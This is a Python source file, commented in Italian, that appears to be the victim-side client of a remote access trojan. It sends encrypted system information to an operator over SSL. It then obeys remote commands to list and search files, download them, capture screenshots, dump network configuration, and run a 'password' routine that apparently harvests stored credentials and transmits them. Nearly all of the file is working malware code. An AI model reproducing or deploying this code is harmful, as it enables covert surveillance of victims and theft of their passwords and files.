from clientSSLconnection import *
from clientSSLFunRC import *
from clientSSL2 import *
from clientSSLgeneral import *

import time
import subprocess
import os
import sys
from colorama import Fore
import zipfile
import traceback
from docx import Document
from pathlib import Path
from PyPDF2 import PdfFileReader
from cryptography.fernet import Fernet
from scapy.all import *
import ipinfo
import json
import base64
import shutil
from datetime import datetime, timedelta
from Crypto.Cipher import AES # pip install pycryptodome
import sqlite3
import win32crypt
from os import system
import pyautogui
from threading import Timer

FORMAT = "utf-8"

# OK mando informazioni so
def sendInfo(client, key):
    infos=""
    mando = 1
    while mando == 1:
        try:
            import platform
            infos = "Operating System: " + platform.system() + "\nMachine: " + platform.machine() + "\nHost: " + platform.node() + "\nProcessor: " + platform.processor() + "\nPlatform: " + platform.platform() + "\nRelease: " + platform.release() + "\nPath: " + os.getcwd()
            key = key.encode(FORMAT)
            fernet = Fernet(key)
            infos = infos.encode(FORMAT)
            infos = fernet.encrypt(infos)
            client.send(((infos)))
            time.sleep(4)
            mando = 0
        except Exception as e:
            if e.__class__.__name__ == "ConnectionResetError":
                mando = 0
                raise e
            elif e.__class__.__name__ == "SSLEOFError":
                mando = 0
                raise e
            else:
                infos="[ERROR] Information not available!\n"
                client.send(((infos)).encode(FORMAT))
                time.sleep(4)
                #traceback.print_exc()
                mando = 0


# funzione di remote control
def openRemoteControl(client):
    comando = "null"
    while comando != "exit":
        try:
            pathSend="[PATH]"+os.getcwd()
            client.send((pathSend).encode(FORMAT))
            time.sleep(0.5)
            comando = client.recv(1024).decode(FORMAT)
            time.sleep(0.5)

            if comando[0:2] == "ls":
                match=regexcheck_ls(comando)
                try:
                    if match:
                        if len(comando) == 2:
                            listdir = os.listdir()
                            lista = []
                            for item in listdir:
                                lista.append("-: " + item + "\n")

                            data = ''.join(lista)
                            if len(data)==0:
                                client.send(("Empty directory").encode(FORMAT))
                            else:
                                client.send((data).encode(FORMAT))
                            time.sleep(1.5)
                        else:
                            comandorisolto = comando.split()
                            path = comandorisolto[1]
                            listdir = os.listdir(path)
                            lista = []
                            for item in listdir:
                                lista.append("-: " + item + "\n")

                            data = ''.join(lista)
                            if len(data) == 0:
                                client.send(("Empty directory").encode(FORMAT))
                            else:
                                client.send((data).encode(FORMAT))
                            time.sleep(1.5)
                except Exception as e:
                    if e.__class__.__name__ == "ConnectionResetError":
                        raise e
                    elif e.__class__.__name__ == "SSLEOFError":
                        raise e
                    else:
                        client.send(("[ERROR]").encode(FORMAT))

            elif comando == "pwd":
                client.send((os.getcwd()).encode(FORMAT))

            elif comando[0:2] == "cd":
                match= regexcheck_cd(comando)
                if match:
                    os.chdir(comando[3:])

            elif comando[0:4] == "rete" or comando[0:7] == "network":
                try:
                    import platform
                    if platform.system() == "Windows":
                        try:
                            data = subprocess.check_output(['ipconfig', '/all']).decode('utf-8')
                        except:
                            data = subprocess.check_output(['ipconfig']).decode('utf-8')

                        result = ["### Network configuration data ###\n"]
                        for item in data:
                            result.append(item)

                        result = ''.join(result)
                        client.send(((result)).encode())
                        time.sleep(1.5)

                    elif platform.system() == "Darwin" or "Linux":
                        try:
                            data = subprocess.check_output(['ifconfig', '-a']).decode('utf-8')
                        except:
                            data = subprocess.check_output(['ifconfig']).decode('utf-8')

                        result = ["### Dati configurazione di rete ###\n"]
                        for item in data:
                            result.append(item)

                        result = ''.join(result)
                        client.send(((result)).encode())
                        time.sleep(1.5)

                except Exception as e:
                    if e.__class__.__name__ == "ConnectionResetError":
                        raise e
                    elif e.__class__.__name__ == "SSLEOFError":
                        raise e
                    else:
                        client.send(("[ERROR]").encode(FORMAT))

            elif comando[0:9] == "filespath":
                #reg = "^filespath( \.[a-z]{1,4})+"
                reg = "^filespath( (\.[*])|( \.[a-z]{1,4}))+"
                if(re.match(reg, comando)):
                    try:
                        estensione = comando[10:]
                        filespath(estensione, client)
                    except:
                        pass
                else:
                    pass

            elif comando[0:7] == "fsearch":
                #reg = "^filespath( \.[a-z]{1,4})+"
                reg = r'^fsearch [\s\S]+\.[a-z]{1,4}'
                reg2 = r'^fsearch "([a-zA-Z0-9, ,\-,\_]+)"'
                if(re.match(reg, comando)) or (re.match(reg2, comando)):
                    try:
                        search(comando[7:], client)
                    except:
                        pass
                else:
                    pass

            elif comando[0:7] == "wsearch":
                    try:
                        searchWord(comando, client)
                    except:
                        pass

            elif comando[0:4] == "find":
                if regexcheck_find(comando) == True:
                    try:
                        find(comando, client)
                        time.sleep(2)
                    except:
                        #traceback.print_exc()
                        pass

            elif comando == "info":
                import platform
                infos = "Operating System: " + platform.system() + "\nMachine: " + platform.machine() + "\nHost: " + platform.node() + "\nProcessor: " + platform.processor() + "\nPlatform: " + platform.platform() + "\nRelease: " + platform.release() + "\nPath: " + os.getcwd() + "\n"
                client.send(((infos)).encode(FORMAT))

            elif comando[0:8] == "download":
                download(comando,client)
                time.sleep(3)

            elif comando[0:12] == "file recenti":
                import platform
                if platform.system() == "Windows":
                    try:
                        process = subprocess.Popen('dir /o-d', stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                                   stdin=subprocess.PIPE, shell=True)
                        timer = Timer(3, process.terminate)
                        try:
                            timer.start()
                            stdout, stderr = process.communicate()
                            output = stdout or stderr
                        finally:
                            timer.cancel()

                        final_output = output.replace(b"\r\n", b"\n").decode(encoding="windows-1252").encode()
                        sent = (final_output.decode())
                        client.send(((sent)).encode())
                        time.sleep(1.5)
                    except Exception as e:
                        if e.__class__.__name__ == "ConnectionResetError":
                            raise e
                        elif e.__class__.__name__ == "SSLEOFError":
                            raise e
                        else:
                            client.send(("[ERROR]").encode(FORMAT))

                elif platform.system() == "Darwin" or "Linux":
                    try:
                        data = subprocess.check_output(['ls', '-lt']).decode('utf-8')
                        result = ""

                        for item in data:
                            result.append(item)

                        result = ''.join(result)
                        client.send(((result)).encode())
                        time.sleep(1.5)
                    except Exception as e:
                        if e.__class__.__name__ == "ConnectionResetError":
                            raise e
                        elif e.__class__.__name__ == "SSLEOFError":
                            raise e
                        else:
                            client.send(("[ERROR]").encode(FORMAT))

            elif comando =="screenshot":
                myScreenshot = pyautogui.screenshot()
                import platform
                if platform.system() == "Windows":
                    myScreenshot.save(os.getcwd() + "\screen.png")
                elif platform.system() == "Darwin":
                    myScreenshot.save(os.getcwd() + "/screen.png")
                else:
                    myScreenshot.save(os.getcwd() + "/screen.png")

                try:
                    filename = "screen.png"
                    filesize = os.path.getsize(filename)
                    if filesize<=0:
                        raise Exception
                    else:
                        with open(filename, 'rb') as f:
                            time.sleep(4)
                            line = f.read(1024)
                            client.send(line)
                            while(line):
                                line = f.read(1024)
                                if line.__sizeof__() > 33 and line.__sizeof__() < 1057:
                                    while line.__sizeof__() < 1057:
                                        line = line + b' '
                                client.send(line)

                            time.sleep(2)
                            f.close()
                            client.send(("[END]").encode(FORMAT))
                            time.sleep(3)
                except Exception as e:
                    if e.__class__.__name__ == "ConnectionResetError":
                        raise e
                    elif e.__class__.__name__ == "SSLEOFError":
                        raise e
                    else:
                        client.send(("[ERROR]").encode(FORMAT))

                os.remove("screen.png")
                time.sleep(5)

            elif comando[0:4]=="open":
                openZip(comando,client)

            elif comando[0:8] == "password":
                result=funHack2()
                result = ''.join(result)
                try:
                    encode = result.encode(FORMAT)
                    x = 1024
                    y = x + 1024

                    line = encode[0:1024]
                    client.send(line)
                    while (line):
                        line = encode[x:y]
                        client.send(line)
                        x = x + 1024
                        y = x + 1024

                    time.sleep(4)
                    client.send(("[END]").encode(FORMAT))
                    time.sleep(4)
                except Exception as e:
                    if e.__class__.__name__ == "ConnectionResetError":
                        raise e
                    elif e.__class__.__name__ == "SSLEOFError":
                        raise e
                    else:
                        client.send(("[ERROR]").encode(FORMAT))
                    time.sleep(4)

            elif comando[0:2] == "ip":
                result = funHack6()
                result=''.join(result)
                try:
                    encode = result.encode(FORMAT)
                    x = 1024
                    y = x + 1024

                    line = encode[0:1024]
                    client.send(line)
                    while (line):
                        line = encode[x:y]
                        client.send(line)
                        x = x + 1024
                        y = x + 1024

                    time.sleep(4)
                    client.send(("[END]").encode(FORMAT))
                    time.sleep(4)
                except Exception as e:
                    if e.__class__.__name__ == "ConnectionResetError":
                        raise e
                    elif e.__class__.__name__ == "SSLEOFError":
                        raise e
                    else:
                        client.send(("[ERROR]").encode(FORMAT))
                    time.sleep(4)

            elif comando[0:9] == "printFile":
                try:
                    regex_match = regexcheck_print(comando)
                    if regex_match == 'windowstip1' or regex_match == 'unixtip1':
                        printFile(comando, client)
                        time.sleep(2)
                except:
                    #traceback.print_exc()
                    pass

            else:
                pass

        except Exception as e:
            #traceback.print_exc()
            if e.__class__.__name__== "ConnectionResetError":
                comando="exit"
            elif e.__class__.__name__ == "SSLEOFError":
                comando = "exit"
            else:
                comando="null"
